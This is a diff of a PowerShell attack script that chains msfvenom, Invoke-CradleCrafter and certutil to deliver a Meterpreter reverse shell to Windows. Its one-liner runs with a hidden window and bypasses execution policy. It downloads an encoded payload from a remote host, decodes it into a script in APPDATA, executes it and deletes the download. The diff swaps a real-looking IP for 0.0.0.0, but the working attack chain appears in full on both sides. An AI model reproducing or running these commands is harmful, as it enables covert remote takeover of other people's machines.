@@ -14,14 +14,14 @@ I also use WSL in this script for interoperability between Win & Kali
 #>
 
 # Generate Payload
-& "$env:windir\system32\wsl.exe" msfvenom -p windows/x64/meterpreter/reverse_https LHOST=51.171.14.37 LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt
+& "$env:windir\system32\wsl.exe" msfvenom -p windows/x64/meterpreter/reverse_https LHOST=http://0.0.0.0/ LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt
 # After this place your generated payload in a web content server folder
 # Importing Cradle Crafter, at the prompt set your IP which was set in the msfvenom payload
-ipmo Invoke-CradleCrafter; Invoke-CradleCrafter -Url 'http://51.171.14.37/load.txt' -Command 'Memory\*\All\1,OUT C:\raw.txt' -Quiet
+ipmo Invoke-CradleCrafter; Invoke-CradleCrafter -Url 'http://0.0.0.0//load.txt' -Command 'Memory\*\All\1,OUT C:\raw.txt' -Quiet
 <##################################
 # ALERNATIVE
 #ipmo .\Invoke-CradleCrafter.psd1  ; Invoke-CradleCrafter
-# SET URL http://x.x.x.x/load.txt
+# SET URL http://0.0.0.0//load.txt
 # MEMORY
 # CERTUTIL
 # ALL
@@ -44,7 +44,7 @@ certutil.exe -encode raw.txt cert.cer
 PS C:\> wsl cp /mnt/c/cert.cer /home/kali/payloads
 #>
 # One-liner:
-& "$env:PSHome\powershell.exe" -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://51.171.14.37/cert.cer'); & "$env:windir\system32\certutil.exe" -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 | start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 | start /b cmd /c del %APPDATA%\cert.cer
+& "$env:PSHome\powershell.exe" -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://0.0.0.0/cert.cer'); & "$env:windir\system32\certutil.exe" -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 | start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 | start /b cmd /c del %APPDATA%\cert.cer
 # Once you have everything set up and your web server started where the content is served. 
 # You can run the above command and you should get a Meterpreter shell.
 # Your web server should get 2 hits.
